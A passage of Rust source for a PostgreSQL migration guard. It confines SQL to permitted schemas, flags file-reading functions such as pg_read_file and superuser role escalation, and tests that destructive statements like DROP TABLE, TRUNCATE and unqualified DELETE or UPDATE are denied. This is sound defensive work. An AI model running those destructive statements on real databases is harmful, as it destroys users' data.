    }
    let (schema, rest) = split_first_qualifier(head);
    // A schema is present only when there is a trailing component after the
    // first dot (`control.t` → `control`; bare `t` → no schema).
    if rest.is_empty() {
        return None;
    }
    let schema = schema.trim();
    if schema.is_empty() {
        None
    } else {
        Some(schema.to_string())
    }
}

/// Split an object-name string on its FIRST top-level `.` separator, honoring a
/// double-quoted leading identifier (where `.` inside the quotes is literal).
/// Returns `(first_component, rest_after_dot)`; `rest` is `""` when there is no
/// dot (an unqualified name).
fn split_first_qualifier(s: &str) -> (String, &str) {
    let bytes = s.as_bytes();
    if bytes.first() == Some(&b'"') {
        // Quoted identifier: scan to the closing quote (doubled "" stays inside).
        let mut i = 1;
        let mut ident = String::new();
        while i < bytes.len() {
            if bytes[i] == b'"' {
                if i + 1 < bytes.len() && bytes[i + 1] == b'"' {
                    ident.push('"');
                    i += 2;
                    continue;
                }
                i += 1; // consume closing quote
                break;
            }
            ident.push(bytes[i] as char);
            i += 1;
        }
        // After the closing quote, a `.` introduces the rest.
        let rest = s.get(i..).unwrap_or("");
        let rest = rest.strip_prefix('.').unwrap_or("");
        (ident, rest)
    } else {
        match s.split_once('.') {
            Some((first, rest)) => (first.to_string(), rest),
            None => (s.to_string(), ""),
        }
    }
}

/// Does a `type_name` resolve to the `regprocedure`/`regproc` reg* family
/// (a function reference by name/OID)?
fn type_is_regproc(type_name: Option<&Value>) -> bool {
    let Some(parts) = qualified_list_parts(type_name.and_then(|t| t.get("names"))) else {
        return false;
    };
    // The bare type name is the trailing part (a `pg_catalog.regprocedure`
    // spelling is possible).
    matches!(
        parts.last().map(String::as_str),
        Some("regprocedure" | "regproc")
    )
}

/// Extract the string-literal value of a `TypeCast.arg` (`AConst { Sval }`).
fn type_cast_string_literal(arg: Option<&Value>) -> Option<String> {
    arg?.get("node")?
        .get("AConst")?
        .get("val")?
        .get("Sval")?
        .get("sval")?
        .as_str()
        .map(str::to_string)
}

/// The leading identifier of a regproc literal, dropping any argument signature
/// and schema qualifier: `pg_read_file(text)` → `pg_read_file`,
/// `pg_catalog.pg_read_file` → `pg_read_file`.
fn regproc_leading_ident(lit: &str) -> &str {
    let head = lit.trim().split('(').next().unwrap_or("").trim();
    head.rsplit('.').next().unwrap_or(head).trim()
}

/// Walk the ENTIRE serialized parse tree for any explicit reference to a schema
/// other than `project_schema`, covering every slot a schema name can hide in.
/// The walker is **typed by slot** (not a key-string allowlist): each
/// schema-qualified-name-bearing node contributes its schema with the
/// [`SchemaSlot`] that fixes the per-slot exemption policy. The slots:
///   - [`SchemaSlot::RangeVar`] — `RangeVar.schemaname` (FROM/DML/ALTER/DROP/
///     partition/INHERIT relation targets). Catalog reads
///     (`pg_catalog.pg_authid`, `information_schema.tables`) are NOT exempt.
///   - [`SchemaSlot::Object`] — `newschema` (SET SCHEMA), `CreateSchemaStmt`
///     `schemaname`, `CommentStmt`/`DropStmt` object lists, index `opclass`,
///     `COLLATE` `collname`, sequence `OWNED BY` — concrete object targets.
///     No exemption beyond own-schema.
///   - [`SchemaSlot::TypeRef`] — `TypeName.names` (column/return/param/cast/
///     `OF` type). Builtins desugar to `pg_catalog.<t>`, so `pg_catalog` (+
///     catalog/`public`) stay exempt here; a foreign tenant type is flagged.
///   - [`SchemaSlot::FuncCall`] — `FuncCall`/trigger/CALL `funcname` *call*
///     qualifier. `pg_catalog`/`information_schema`/`public` calls are routine
///     and exempt; a tenant-schema call is flagged.
///
/// Function *definition* targets (`CreateFunctionStmt`/`AlterFunctionStmt`
/// funcname) are NOT walked here — they are a *creation target*, never a call
/// qualifier, so they are checked directly against the project schema in
/// [`SqlGuard::check_func_def_target`] with NO shared-schema exemption
/// (`public.evil`, `pg_catalog.evil`, `information_schema.evil` all denied).
///
/// Returns the first foreign schema found.
fn foreign_schema_in_tree(v: &Value, scope: &SchemaScope) -> Option<String> {
    let mut found: Option<String> = None;
    walk_schema_names(v, &mut |schema, slot| {
        if schema.is_empty() || scope.permits(schema) {
            return false;
        }
        if slot_exempts_schema(slot, schema) {
            return false;
        }
        found = Some(schema.to_string());
        true
    });
    found
}

/// Per-slot schema exemption. A neutral schema is exempt only in the slots
/// where naming it is routine and benign — never as a broad whitelist.
fn slot_exempts_schema(slot: SchemaSlot, schema: &str) -> bool {
    match slot {
        // Nothing is exempt:
        //   - RangeVar/Object: concrete relation/object targets reach a real
        //     object outside the pinned schema (catalog reads denied here);
        //   - CreationTarget: planting/altering a type INTO a schema (CREATE
        //     TYPE … AS ENUM/RANGE, ALTER TYPE …) — mirrors a function
        //     *definition* target, so `public`/`pg_catalog`/`control` are all
        //     denied, same as any other tenant schema.
        SchemaSlot::RangeVar | SchemaSlot::Object | SchemaSlot::CreationTarget => false,
        // Built-in-bearing object sub-slots: index `opclass` and `COLLATE`
        // `collname` routinely name a `pg_catalog` builtin
        // (`pg_catalog.text_ops`, `pg_catalog."C"`). `pg_catalog` ONLY is
        // exempt here (not `public`, not other catalog schemas, not a tenant
        // schema — `control.myops` stays denied).
        SchemaSlot::BuiltinObject => schema.eq_ignore_ascii_case("pg_catalog"),
        // Type references (builtins desugar to `pg_catalog.<type>`) and
        // function *call* qualifiers: catalog + `public` are routine and
        // benign. Catalog table *reads* go via RangeVar (not exempt there);
        // function *definition* targets are checked separately (no exemption).
        SchemaSlot::TypeRef | SchemaSlot::FuncCall => {
            is_neutral_catalog_schema(schema) || schema.eq_ignore_ascii_case("public")
        }
    }
}

/// The server's own catalog/temp schemas — never a cross-tenant target. Used
/// only for the slots where naming them is benign (type refs, function calls);
/// table reads from them are caught via [`SchemaSlot::RangeVar`].
fn is_neutral_catalog_schema(schema: &str) -> bool {
    ["pg_catalog", "pg_temp", "pg_toast", "information_schema"]
        .iter()
        .any(|s| schema.eq_ignore_ascii_case(s))
}

/// Which kind of parse-tree slot a candidate schema name came from. Drives the
/// per-slot exemption policy in [`slot_exempts_schema`].
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum SchemaSlot {
    /// `RangeVar.schemaname` — a relation read/write/target. Catalog reads are
    /// NOT exempt here.
    RangeVar,
    /// A concrete object/schema target: `newschema`, `CreateSchemaStmt`
    /// `schemaname`, COMMENT/RENAME `object`, DROP `objects`, `ObjectWithArgs`
    /// `objname`, sequence `OWNED BY` / identity `SEQUENCE NAME`.
    Object,
    /// A creation/alter target carried in a `type_name` qualified-name *list*
    /// (`CreateEnumStmt`/`CreateRangeStmt`/`AlterEnumStmt`/`AlterTypeStmt`):
    /// planting/altering a type INTO a schema. Like a function-definition
    /// target, NO shared-schema exemption — `public.e`/`pg_catalog.e`/
    /// `control.e` are all denied. (Distinct from [`SchemaSlot::TypeRef`],
    /// which is a `TypeName.names` *reference* where builtins are exempt.)
    CreationTarget,
    /// A built-in-bearing object sub-slot: index `opclass` / `COLLATE`
    /// `collname`. These routinely name a `pg_catalog` builtin
    /// (`pg_catalog.text_ops`, `pg_catalog."C"`), so `pg_catalog` ONLY is
    /// exempt; a foreign tenant/platform opclass or collation is denied.
    BuiltinObject,
    /// A type reference (`TypeName.names`): column/return/param/cast/`OF` type.
    TypeRef,
    /// A function-name *call* qualifier (`FuncCall`/trigger/CALL `funcname`).
    /// Function *definition* targets are NOT this slot — they are checked
    /// against the project schema directly in [`SqlGuard::check_func_def_target`]
    /// (no shared-schema exemption).
    FuncCall,
}

/// The traversal behind [`foreign_schema_in_tree`]. Invokes `visit(schema,
/// slot)` for every candidate schema string; returns `true` once `visit`
/// short-circuits.
///
/// Typed by node shape, not a key-string allowlist: each schema-qualified-name
/// node contributes its schema with the slot that fixes its exemption policy.
fn walk_schema_names(v: &Value, visit: &mut dyn FnMut(&str, SchemaSlot) -> bool) -> bool {
    match v {
        Value::Object(map) => {
            // A `RangeVar` (relation target) carries its schema in
            // `schemaname` AND a `relname` sibling — the relation slot.
            if map.contains_key("relname") {
                if let Some(Value::String(s)) = map.get("schemaname") {
                    if !s.is_empty() && visit(s, SchemaSlot::RangeVar) {
                        return true;
                    }
                }
            } else if let Some(Value::String(s)) = map.get("schemaname") {
                // `CreateSchemaStmt.schemaname` (no `relname` sibling) — a
                // concrete schema target.
                if !s.is_empty() && visit(s, SchemaSlot::Object) {
                    return true;
                }
            }
            // `AlterObjectSchemaStmt.newschema` (`… SET SCHEMA control`).
            if let Some(Value::String(s)) = map.get("newschema") {
                if !s.is_empty() && visit(s, SchemaSlot::Object) {
                    return true;
                }
            }
            // `TypeName.names` — column/return/param/cast/OF type reference.
            // The presence of the `names` key alongside type-name siblings is
            // the TypeName tell.
            if let Some(schema) = qualified_list_schema(map.get("names")) {
                if visit(&schema, SchemaSlot::TypeRef) {
                    return true;
                }
            }
            // `type_name` as a qualified-name *list* (NOT a nested `TypeName`
            // object): the creation/alter target of CreateEnumStmt /
            // CreateRangeStmt / AlterEnumStmt / AlterTypeStmt. (`CreateStmt`/
            // `ColumnDef` carry `type_name` as a nested `TypeName` *object*
            // whose schema lives under `names`, handled above — a non-array
            // `type_name` yields no parts here, so this is target-only.)
            if let Some(schema) = qualified_list_schema(map.get("type_name")) {
                if visit(&schema, SchemaSlot::CreationTarget) {
                    return true;
                }
            }
            // `CreateDomainStmt.domainname` — the schema-qualified creation
            // target of `CREATE DOMAIN <schema>.<name> AS …`. Same confinement
            // class as the type-creation `type_name` target above: a Confined
            // migrator may not plant a domain into a foreign/system schema.
            if let Some(schema) = qualified_list_schema(map.get("domainname")) {
                if visit(&schema, SchemaSlot::CreationTarget) {
                    return true;
                }
            }
            // Qualified function-name *call* lists: trigger/CALL/FuncCall.
            if let Some(schema) = qualified_list_schema(map.get("funcname")) {
                if visit(&schema, SchemaSlot::FuncCall) {
                    return true;
                }
            }
            // COMMENT/RENAME/DEPENDS `object` (singular) + `ObjectWithArgs`
            // `objname` — a concrete object target ([schema, object]).
            for key in ["object", "objname"] {
                if let Some(schema) = qualified_list_schema(map.get(key)) {
                    if visit(&schema, SchemaSlot::Object) {
                        return true;
                    }
                }
            }
            // DROP/GRANT `objects` (PLURAL): a list whose *items* are each a
            // qualified-name node (`List`/`TypeName`/`ObjectWithArgs`). Walk
            // each item's own qualifier — flattening the outer array would
            // mis-read it. (`DROP TYPE control.t` carries a `TypeName` item,
            // already covered by the `names` walk above; tables/indexes/
            // views/sequences/triggers/functions carry a `List`/`ObjectWithArgs`
            // the singular `object`/`names` keys never reach.)
            if let Some(Value::Array(items)) = map.get("objects") {
                for item in items {
                    if let Some(schema) = qualified_list_schema(Some(item)) {
                        if visit(&schema, SchemaSlot::Object) {
                            return true;
                        }
                    }
                }
            }
            // Built-in-bearing sub-slots: index `opclass` ([schema, opclass]),
            // COLLATE `collname` ([schema, collation]). `pg_catalog` builtins
            // are exempt here (and only here) via SchemaSlot::BuiltinObject.
            for key in ["opclass", "collname"] {
                if let Some(schema) = qualified_list_schema(map.get(key)) {
                    if visit(&schema, SchemaSlot::BuiltinObject) {
                        return true;
                    }
                }
            }
            // DefElem object slots:
            //   - `owned_by`: `OWNED BY <schema>.<table>.<column>` — 2-part
            //     (`table.col`, no schema) or 3-part (`schema.table.col`);
            //     schema present only at 3 parts.
            //   - `sequence_name`: identity `… (SEQUENCE NAME <schema>.s)` —
            //     a `List[schema, name]` (schema present at 2+ parts).
            match map.get("defname").and_then(Value::as_str) {
                Some("owned_by") => {
                    if let Some(schema) = owned_by_schema(map.get("arg")) {
                        if visit(&schema, SchemaSlot::Object) {
                            return true;
                        }
                    }
                }
                Some("sequence_name") => {
                    if let Some(schema) = qualified_list_schema(map.get("arg")) {
                        if visit(&schema, SchemaSlot::Object) {
                            return true;
                        }
                    }
                }
                Some("schema") => {
                    // `CreateExtensionStmt … WITH SCHEMA <name>` — a bare String DefElem
                    // arg. Confine the WITH SCHEMA target so the rendered-SQL guard
                    // (gate 2) independently scopes it, restoring gate-1/gate-2 parity
                    // with `createSchema` (SA-20). Strictly tighter: anything passing
                    // gate 1 is already in scope, so this adds no false-positives.
                    if let Some(s) = map.get("arg").and_then(json_string_node) {
                        if !s.is_empty() && visit(&s, SchemaSlot::Object) {
                            return true;
                        }
                    }
                }
                _ => {}
            }
            for child in map.values() {
                if walk_schema_names(child, visit) {
                    return true;
                }
            }
            false
        }
        Value::Array(items) => items.iter().any(|i| walk_schema_names(i, visit)),
        _ => false,
    }
}

/// If `v` is a qualified-name list with 2+ String parts, return the FIRST part
/// (the schema qualifier). A single-part list is an unqualified name (no
/// schema) and returns `None`.
///
/// Handles both spellings the parse tree uses:
///   - a bare array (`CreateTrigStmt.funcname`, `CallStmt…funcname`,
///     `TypeName.names`, `IndexElem.opclass`, `CollateClause.collname`):
///     `[{node:{String}}, …]`
///   - a `List` node (`CommentStmt.object`): `{node:{List:{items:[…]}}}`
fn qualified_list_schema(v: Option<&Value>) -> Option<String> {
    let parts = qualified_list_parts(v)?;
    if parts.len() >= 2 {
        Some(parts[0].clone())
    } else {
        None
    }
}

/// The schema of an `OWNED BY` target. The list is `[table, col]` (no schema,
/// 2 parts) or `[schema, table, col]` (3 parts) — so a schema is present only
/// at 3+ parts, and is `parts[0]`.
fn owned_by_schema(v: Option<&Value>) -> Option<String> {
    let parts = qualified_list_parts(v)?;
    if parts.len() >= 3 {
        Some(parts[0].clone())
    } else {
        None
    }
}

/// Flatten a qualified-name list (bare array or `List` node) to its String
/// parts.
fn qualified_list_parts(v: Option<&Value>) -> Option<Vec<String>> {
    let arr = match v {
        Some(Value::Array(a)) => a.as_slice(),
        Some(obj) => match obj.get("node").and_then(|n| n.get("List")).and_then(|l| l.get("items"))
        {
            Some(Value::Array(a)) => a.as_slice(),
            _ => return None,
        },
        None => return None,
    };
    Some(arr.iter().filter_map(json_string_node).collect())
}

/// The trailing String of a `funcname`-style array (the bare name).
fn json_last_string_part(parts: &[Value]) -> Option<String> {
    parts.iter().rev().find_map(json_string_node)
}

/// Extract the inner string of a `{"node":{"String":{"sval":"…"}}}` value.
fn json_string_node(v: &Value) -> Option<String> {
    v.get("node")?
        .get("String")?
        .get("sval")?
        .as_str()
        .map(str::to_string)
}

fn guard_stmt_json<T: serde::Serialize>(raw_stmt: &T, raw: &str) -> Result<Value, GuardError> {
    serde_json::to_value(raw_stmt).map_err(|_| denied(rule::INTERNAL_GUARD_ERROR, raw))
}

/// Build a [`GuardError::Denied`].
fn denied(rule: &'static str, statement: &str) -> GuardError {
    GuardError::Denied {
        rule,
        statement: statement.to_string(),
    }
}

/// Extract the `language` option of a CREATE FUNCTION.
fn function_language(options: &[protobuf::Node]) -> Option<String> {
    for opt in options {
        if let Some(NodeEnum::DefElem(d)) = opt.node.as_ref() {
            if d.defname.eq_ignore_ascii_case("language") {
                if let Some(NodeEnum::String(s)) = d.arg.as_ref().and_then(|a| a.node.as_ref()) {
                    return Some(s.sval.clone());
                }
            }
        }
    }
    None
}

/// Extract the body string(s) of a CREATE FUNCTION (`AS $$…$$`). The `as`
/// `DefElem`'s arg is a List of String nodes.
fn function_body_strings(options: &[protobuf::Node]) -> Vec<String> {
    let mut out = Vec::new();
    for opt in options {
        if let Some(NodeEnum::DefElem(d)) = opt.node.as_ref() {
            if d.defname.eq_ignore_ascii_case("as") {
                if let Some(arg) = d.arg.as_ref().and_then(|a| a.node.as_ref()) {
                    match arg {
                        NodeEnum::String(s) => out.push(s.sval.clone()),
                        NodeEnum::List(list) => {
                            for item in &list.items {
                                if let Some(NodeEnum::String(s)) = item.node.as_ref() {
                                    out.push(s.sval.clone());
                                }
                            }
                        }
                        _ => {}
                    }
                }
            }
        }
    }
    out
}

/// Extract `DefElem` string args (DO block body lives in such an arg).
fn def_elem_string_args(args: &[protobuf::Node]) -> Vec<String> {
    let mut out = Vec::new();
    for a in args {
        if let Some(NodeEnum::DefElem(d)) = a.node.as_ref() {
            if let Some(NodeEnum::String(s)) = d.arg.as_ref().and_then(|x| x.node.as_ref()) {
                out.push(s.sval.clone());
            }
        }
    }
    out
}

/// Pull single-quoted string literals out of a body (best-effort, for
/// `EXECUTE 'literal sql'`). Handles doubled-quote `''` escapes.
///
/// Iterates real `char`s (not raw bytes): a `bytes[j] as char` cast truncates
/// every non-ASCII UTF-8 byte to a Latin-1 codepoint, corrupting any multi-byte
/// character inside a literal — which could split a dangerous token off from its
/// adjacent multi-byte char and let the backstop's word-scan miss it. The primary
/// defense is the `pg_query` parse + least-priv role; this is the body token-scan
/// backstop, so its extraction must be byte-faithful.
fn extract_string_literals(body: &str) -> Vec<String> {
    let mut out = Vec::new();
    // (byte_offset, char) pairs so we can index forward over the source faithfully.
    let chars: Vec<(usize, char)> = body.char_indices().collect();
    let mut i = 0;
    while i < chars.len() {
        if chars[i].1 == '\'' {
            let mut j = i + 1;
            let mut buf = String::new();
            while j < chars.len() {
                if chars[j].1 == '\'' {
                    if j + 1 < chars.len() && chars[j + 1].1 == '\'' {
                        buf.push('\'');
                        j += 2;
                        continue;
                    }
                    break;
                }
                buf.push(chars[j].1);
                j += 1;
            }
            if !buf.is_empty() {
                out.push(buf);
            }
            i = j + 1;
        } else {
            i += 1;
        }
    }
    out
}

/// Whole-word match (so `pg_read_file` does not match `my_pg_read_files`).
fn word_present(haystack: &str, needle: &str) -> bool {
    let mut start = 0;
    while let Some(pos) = haystack[start..].find(needle) {
        let abs = start + pos;
        let before = abs.checked_sub(1).map(|p| haystack.as_bytes()[p]);
        let after = haystack.as_bytes().get(abs + needle.len()).copied();
        let ok_before = before.is_none_or(|b| !is_ident_byte(b));
        let ok_after = after.is_none_or(|b| !is_ident_byte(b));
        if ok_before && ok_after {
            return true;
        }
        start = abs + 1;
    }
    false
}

const fn is_ident_byte(b: u8) -> bool {
    b.is_ascii_alphanumeric() || b == b'_'
}

fn body_contains_superuser_role_escalation(lower: &str) -> bool {
    word_present(lower, "superuser")
        && (lower.contains("create role")
            || lower.contains("create user")
            || lower.contains("alter role")
            || lower.contains("alter user"))
}

/// Slice the original source for a statement using its byte offsets.
fn stmt_text(sql: &str, raw_stmt: &protobuf::RawStmt) -> String {
    let start = usize::try_from(raw_stmt.stmt_location).unwrap_or(0).min(sql.len());
    let len = usize::try_from(raw_stmt.stmt_len).unwrap_or(0);
    let end = if len == 0 { sql.len() } else { (start + len).min(sql.len()) };
    sql.get(start..end).unwrap_or("").trim().to_string()
}

// ===========================================================================
// In-crate tests — these MUST live in-crate because `OperatorCapability::for_test`
// and `GuardConfig::platform` are `pub(crate)` (the external trust boundary is
// pinned separately by the `tests/trybuild_*` compile-fail tests, T8).
//
// Coverage map:
//   T11  — capability minting is named-seam-only by convention.
//   T4   — Platform widening is correct AND bounded (privileged constructs pass;
//          RCE/host-escape/cross-schema-to-creator still denied).
//   T4b  — DO-block privileged DDL applies under Platform; the RCE token-scan
//          stays hard even under Platform; the same blocks deny under Confined.
//   T2   — the SchemaScope swap is byte-identical under Single for the
//          func-def-target + literal-schema-ref read sites.
// ===========================================================================
#[cfg(test)]
mod tests {
    use super::*;

    /// A Platform guard over the real port allowlist (`zeroship` / `oauth_hydra`
    /// / `public`) + the two ported extensions. Minted via the `for_test` seam,
    /// which is `#[cfg(test)]`-only.
    fn platform_guard() -> SqlGuard {
        SqlGuard::new(platform_guard_config())
    }

    fn platform_guard_config() -> GuardConfig {
        let cap = OperatorCapability::for_test();
        GuardConfig::platform(
            &cap,
            vec![
                "zeroship".to_string(),
                "oauth_hydra".to_string(),
                "public".to_string(),
            ],
            vec!["citext".to_string(), "uuid-ossp".to_string()],
        )
    }

    fn confined_guard_config() -> GuardConfig {
        GuardConfig::confined("zeroship")
    }

    fn confined_guard() -> SqlGuard {
        SqlGuard::new(confined_guard_config())
    }

    fn vendor_ir(op: crate::model::ir::Op) -> crate::model::ir::MigrationIr {
        crate::model::ir::MigrationIr {
            ir_version: crate::model::ir::CURRENT_IR_VERSION,
            name: "vendor_guard_probe".into(),
            owner_app: "app_corpus".into(),
            ops: vec![op],
            flags: Default::default(),
            depends_on: Vec::new(),
            supersedes: Vec::new(),
            preconditions: Vec::new(),
            checksum: None,
        }
    }

    fn ir_with(ops: Vec<Op>) -> MigrationIr {
        MigrationIr {
            ir_version: crate::model::ir::CURRENT_IR_VERSION,
            name: "data_security_probe".into(),
            owner_app: "app_corpus".into(),
            ops,
            flags: Default::default(),
            depends_on: Vec::new(),
            supersedes: Vec::new(),
            preconditions: Vec::new(),
            checksum: None,
        }
    }

    fn create_table(name: &str) -> Op {
        Op::CreateTable {
            name: name.to_string(),
            columns: Vec::new(),
            constraints: Vec::new(),
            indexes: Vec::new(),
            runtime_options: None,
            schema: None,
            existence_guard: None,
        }
    }

    #[test]
    fn destructive_ops_forbid_denies_structured_destructive_sql_classes() {
        let confined = SqlGuard::new(
            GuardConfig::confined("public")
                .with_data_security(false, DestructiveOps::Forbid),
        );
        for sql in [
            "DROP TABLE users",
            "ALTER TABLE users DROP COLUMN email",
            "ALTER TABLE users DROP CONSTRAINT users_email_key",
            "ALTER TABLE users ALTER COLUMN age TYPE smallint",
            "TRUNCATE users",
            "DELETE FROM users",
            "DROP MATERIALIZED VIEW users_mv",
            "DROP VIEW users_view",
            "DROP INDEX users_email_idx",
        ] {
            assert!(
                matches!(
                    confined.check(sql),
                    Err(GuardError::DataSecurityPolicy {
                        rule: data_security_rule::DESTRUCTIVE_OPS_FORBID,
                        ..
                    })
                ),
                "expected destructive_ops=forbid to deny {sql}"
            );
        }

        let platform = SqlGuard::new(
            platform_guard_config().with_data_security(false, DestructiveOps::Forbid),
        );
        assert!(matches!(
            platform.check("DROP SCHEMA public"),
            Err(GuardError::DataSecurityPolicy {
                rule: data_security_rule::DESTRUCTIVE_OPS_FORBID,
                ..
            })
        ));
    }

    #[test]
    fn destructive_ops_forbid_denies_dml_holes_and_unknowns_fail_closed() {
        let guard = SqlGuard::new(
            GuardConfig::confined("public").with_data_security(false, DestructiveOps::Forbid),
        );

        for sql in [
            "UPDATE users SET email = NULL",
            "DELETE FROM users",
            "DELETE FROM users WHERE 1=1",
            "MERGE INTO users USING incoming ON users.id = incoming.id WHEN MATCHED THEN DELETE",
        ] {
            assert!(
                matches!(
                    guard.check(sql),
                    Err(GuardError::DataSecurityPolicy {
                        rule: data_security_rule::DESTRUCTIVE_OPS_FORBID,
                        ..
                    })
                ),
                "expected destructive_ops=forbid to deny destructive DML hole {sql}"
            );
        }

        assert!(
            matches!(
                guard.check("DO $$ BEGIN NULL; END $$"),
                Err(GuardError::DataSecurityPolicy {
                    rule: data_security_rule::UNCLASSIFIED_OP_DENIED_UNDER_FORBID,
                    ..
                })
            ),
            "unclassified statements must be denied under destructive_ops=forbid"
        );
    }

    #[test]
    fn destructive_ops_warn_allows_and_records_structured_warning() {
        let guard = SqlGuard::new(
            GuardConfig::confined("public").with_data_security(false, DestructiveOps::Warn),
        );

        for sql in [
            "DELETE FROM users",
            "DROP MATERIALIZED VIEW users_mv",
            "DROP VIEW users_view",
            "DROP INDEX users_email_idx",
            "ALTER TABLE users DROP CONSTRAINT users_email_key",
        ] {
            let report = guard.check(sql).expect("warn permits destructive SQL");

            assert!(
                report.advisories.iter().any(|a| {
                    a.rule == crate::analysis::analyze::rule::DATA_SECURITY_DESTRUCTIVE_OPS_WARN
                }),
                "warn must record advisory for {sql}: {:?}",
                report.advisories
            );
        }
    }

    #[test]
    fn destructive_ops_warn_allows_and_records_unknown_warning() {
        let guard = SqlGuard::new(
            GuardConfig::confined("public").with_data_security(false, DestructiveOps::Warn),
        );

        let report = guard
            .check("DO $$ BEGIN NULL; END $$")
            .expect("warn permits unclassified SQL with an advisory");

        assert!(
            report.advisories.iter().any(|a| {
                a.rule == crate::analysis::analyze::rule::DATA_SECURITY_UNCLASSIFIED_OPS_WARN
            }),
            "warn must record advisory for unclassified SQL: {:?}",
            report.advisories
        );
    }

    #[test]
    fn destructive_ops_allow_is_silent_for_policy_warning() {
        let guard = SqlGuard::new(
            GuardConfig::confined("public").with_data_security(false, DestructiveOps::Allow),
        );

        let report = guard.check("DROP TABLE users").expect("allow permits the drop");

        assert!(!report.advisories.iter().any(|a| {
            a.rule == crate::analysis::analyze::rule::DATA_SECURITY_DESTRUCTIVE_OPS_WARN
        }));
    }

    #[test]
    fn destructive_ops_forbid_allows_clearly_non_destructive_sql() {
        let guard = SqlGuard::new(
            GuardConfig::confined("public").with_data_security(false, DestructiveOps::Forbid),
        );

        guard
            .check("CREATE TABLE users(id bigint primary key)")
            .expect("CREATE TABLE is not destructive");
        guard
            .check("ALTER TABLE users ADD COLUMN email text")
            .expect("ADD COLUMN is not destructive");
        guard
            .check("CREATE INDEX users_email_idx ON users(email)")
            .expect("CREATE INDEX is not destructive");
        guard
            .check("INSERT INTO users(id) VALUES (1)")
            .expect("INSERT is not destructive");

        let platform = SqlGuard::new(
            platform_guard_config().with_data_security(false, DestructiveOps::Forbid),
        );
        platform
            .check("CREATE SCHEMA IF NOT EXISTS oauth_hydra")
            .expect("CREATE SCHEMA is not destructive");
        platform
            .check("ALTER TABLE zeroship.app_secrets ENABLE ROW LEVEL SECURITY")
            .expect("ENABLE RLS is not destructive");
    }

    #[test]
    fn require_rls_rejects_create_table_without_same_migration_enable() {
        let cfg = platform_guard_config().with_data_security(true, DestructiveOps::Allow);
        let ir = ir_with(vec![create_table("users")]);

        let err = check_ir_data_security_policy(&cfg, &ir).unwrap_err();

        assert_eq!(err.op_index, 0);
        assert!(matches!(
            err.source,
            GuardError::DataSecurityPolicy {
                rule: data_security_rule::REQUIRE_RLS,
                ..
            }
        ));
    }

    #[test]
    fn require_rls_accepts_create_table_with_same_migration_enable() {
        let cfg = platform_guard_config().with_data_security(true, DestructiveOps::Allow);
        let ir = ir_with(vec![
            create_table("users"),
            Op::EnableRls {
                table: "users".to_string(),
                schema: None,
            },
        ]);

        check_ir_data_security_policy(&cfg, &ir).expect("matching enableRls satisfies require_rls");
    }

    #[test]
    fn require_rls_rejects_create_enable_disable_net_off() {
        let cfg = platform_guard_config().with_data_security(true, DestructiveOps::Allow);
        let ir = ir_with(vec![
            create_table("users"),
            Op::EnableRls {
                table: "users".to_string(),
                schema: None,
            },
            Op::DisableRls {
                table: "users".to_string(),
                schema: None,
            },
        ]);

        let err = check_ir_data_security_policy(&cfg, &ir).unwrap_err();

        assert_eq!(err.op_index, 2);
        assert!(matches!(
            err.source,
            GuardError::DataSecurityPolicy {
                rule: data_security_rule::REQUIRE_RLS,
                ..
            }
        ));
    }

    #[test]
    fn require_rls_rejects_standalone_disable_and_no_force() {
        let cfg = platform_guard_config().with_data_security(true, DestructiveOps::Allow);

        for op in [
            Op::DisableRls {
                table: "users".to_string(),
                schema: None,
            },
            Op::NoForceRls {
                table: "users".to_string(),
                schema: None,
            },
        ] {
            let err = check_ir_data_security_policy(&cfg, &ir_with(vec![op])).unwrap_err();
            assert_eq!(err.op_index, 0);
            assert!(matches!(
                err.source,
                GuardError::DataSecurityPolicy {
                    rule: data_security_rule::REQUIRE_RLS,
                    ..
                }
            ));
        }
    }

    #[test]
    fn require_rls_rejects_pg_raw_table_creation_island_fail_closed() {
        let cfg = platform_guard_config().with_data_security(true, DestructiveOps::Allow);
        let author = platform_author(&cfg);
        let op = Op::PgRaw {
            sql: "CREATE TABLE zeroship.raw_users AS SELECT 1 AS id".into(),
            binds: Vec::new(),
        };

        match author.lower_guarded(
            &vendor_ir(op),
            &cfg,
            &crate::render::lower::LiveSchema::default(),
        ) {
            Err(crate::render::lower::IrGuardedLowerError::Denied(denial)) => {
                assert_eq!(denial.op_kind, "pgRaw");
                assert!(matches!(
                    denial.source,
                    GuardError::DataSecurityPolicy {
                        rule: data_security_rule::REQUIRE_RLS,
                        ..
                    }
                ));
            }
            other => panic!("require_rls must reject raw table-creation islands; got {other:?}"),
        }
    }

    fn platform_author(guard_cfg: &GuardConfig) -> crate::render::lower::IrAuthor {
        let scope = guard_cfg
            .schema_scope()
            .expect("Platform guard carries an allowlist scope");
        crate::render::lower::IrAuthor::new("zeroship", "app_corpus", SqlDialect::Postgres)
            .with_schema_scope(scope)
    }

    fn is_denied(g: &SqlGuard, sql: &str) -> bool {
        matches!(
            g.check(sql),
            Err(
                GuardError::Denied { .. }
                    | GuardError::CrossSchema { .. }
                    | GuardError::DataSecurityPolicy { .. }
            )
        )
    }

    #[derive(Debug, Clone, Copy, PartialEq, Eq)]
    enum GuardDecision {
        Allow,
        Denied(&'static str),
        CrossSchema,
        Parse,
        RawRejected,
    }

    fn decision_of(g: &SqlGuard, sql: &str) -> GuardDecision {
        match g.check(sql) {
            Ok(_) => GuardDecision::Allow,
            Err(GuardError::Denied { rule, .. }) => GuardDecision::Denied(rule),
            Err(GuardError::DataSecurityPolicy { rule, .. }) => GuardDecision::Denied(rule),
            Err(GuardError::CrossSchema { .. }) => GuardDecision::CrossSchema,
            Err(GuardError::Parse(_)) => GuardDecision::Parse,
            Err(GuardError::SqliteRawSqlRejected | GuardError::MysqlRawSqlRejected) => {
                GuardDecision::RawRejected
            }
        }
    }

    fn raw_body_backstop_decision(cfg: &GuardConfig, body: &str) -> GuardDecision {
        let guard = SqlGuard::new(cfg.clone());
        let raw = "CREATE FUNCTION public.f() RETURNS void LANGUAGE plpgsql AS $$...$$";
        match guard.check_raw_island_body_backstop(body, raw) {
            Ok(()) => GuardDecision::Allow,
            Err(GuardError::Denied { rule, .. }) => GuardDecision::Denied(rule),
            Err(GuardError::DataSecurityPolicy { rule, .. }) => GuardDecision::Denied(rule),
            Err(GuardError::CrossSchema { .. }) => GuardDecision::CrossSchema,
            Err(GuardError::Parse(_)) => GuardDecision::Parse,
            Err(GuardError::SqliteRawSqlRejected | GuardError::MysqlRawSqlRejected) => {
                GuardDecision::RawRejected
            }
        }
    }

    fn assert_profile_decisions(
        site: &str,
        sql: &str,
        confined: GuardDecision,
        platform: GuardDecision,
        trusted: GuardDecision,
    ) {
        let profiles = [
